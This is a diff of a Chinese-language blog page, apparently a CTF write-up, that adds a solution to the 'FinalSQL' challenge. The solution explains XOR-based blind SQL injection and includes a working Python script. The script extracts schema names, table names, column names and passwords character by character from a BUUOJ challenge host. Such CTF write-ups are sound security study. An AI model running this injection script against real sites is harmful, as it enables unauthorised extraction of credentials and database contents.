@@ -236,7 +236,13 @@
 <p>字符串表达式，从最右边的字符返回length长度。</p>
 <p>而这里因为显示的长度有限，且回显是从右向左的，这就是为什么我们改变length，却只能看到一部分，而当length的值超过flag的长度时，就只回显前面一部分的，也就是说，其实这不简单的是左右拼接，而是可选的回显部分，根本就是他对回显长度进行了限制。left()同理，但这里却不能用，因为left是从左边开始，在长度的限制下我们就无法看到偏右的值了。</p>
 <h4 id="FinalSQL">FinalSQL</h4>
-<p>这一关做了很久，但还是不太行，先搁着吧。</p>
+<p>本关主要考察的就是脚本的运用，有了上面的几关的经验，我们在查询一下过滤的字符有哪些，发现substr函数是可以使用的，同时<code>^</code>也是不被过滤的，这时候我们需要补充<strong>逻辑异或</strong>的知识。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^1=0,0^0=0,1^0=1</span><br></pre></td></tr></table></figure>
+<p>表示只有前后不同的情况下才会返回真，我们构造payload：<code>?id=1^  ()  ^1</code></p>
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://bc33fda9-9a2e-4f4b-8dc0-82fdc38e6427.node4.buuoj.cn:81/search.php?id=1%E2%80%98&quot;</span><br><span class="line">temp = &#123;&quot;id&quot; : &quot;&quot;&#125;</span><br><span class="line">column = &quot;&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    time.sleep(0.06)</span><br><span class="line">    low = 32</span><br><span class="line">    high =128</span><br><span class="line">    mid = (low+high)//2</span><br><span class="line">    while(low&lt;high):</span><br><span class="line">        #库名</span><br><span class="line">        #temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        #表名</span><br><span class="line">        #temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        #字段名</span><br><span class="line">        #temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        #内容</span><br><span class="line">        temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        r = requests.get(url,params=temp)</span><br><span class="line">        time.sleep(0.04)</span><br><span class="line">        print(low,high,mid,&quot;:&quot;)</span><br><span class="line">        if &quot;Click&quot; in r.text:</span><br><span class="line">            low = mid+1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid =(low+high)//2</span><br><span class="line">    if(mid ==32 or mid ==127):</span><br><span class="line">        break</span><br><span class="line">    column +=chr(mid)</span><br><span class="line">    print(column)</span><br><span class="line">    </span><br><span class="line">print(&quot;All:&quot; ,column)</span><br></pre></td></tr></table></figure>
+<p>慢慢运行脚本就可以拿到flag了，对于如何写脚本，则需要多学学python，其中，payload对脚本影响最为深远。</p>
+<p><img src="/2021/11/11/SQL%E6%97%A5%E5%BF%97/flag.png" alt></p>
 </section>
     <!-- Tags START -->
     
@@ -253,6 +259,13 @@
         
       </a>
     
+    
+      <a class="nav-right" href="/2021/11/21/PHP%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/">
+        
+          PHP字符串操作
+        
+        <span class="nav-arrow"> →</span>
+      </a>
     
   </div>
 
